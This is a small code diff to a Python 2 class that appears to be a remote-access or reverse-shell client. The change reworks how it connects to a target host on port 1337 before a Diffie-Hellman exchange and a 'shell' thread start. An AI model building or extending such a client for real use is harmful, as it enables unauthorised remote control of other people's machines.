@@ -371,10 +371,11 @@ class Client(object):
             if self.__v__:
                 print 'Target error: {}'.format(str(e))
     
-    def _connect(self, host='localhost', port=1337):
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    def _connect(self, port=1337):
         try:
-            s.connect((host, port))
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            __host__ = self._target() 
+            s.connect((__host__, port))
             return s
         except Exception as e:
             if self.__v__:
@@ -723,7 +724,7 @@ class Client(object):
 
     def _start(self):
         try:
-            self._socket  = self._connect(host=self._target())
+            self._socket  = self._connect()
             self._dhkey   = self._diffiehellman()
             self._threads['shell'] = threading.Thread(target=self.shell, name='shell')
             self.standby.status.clear()
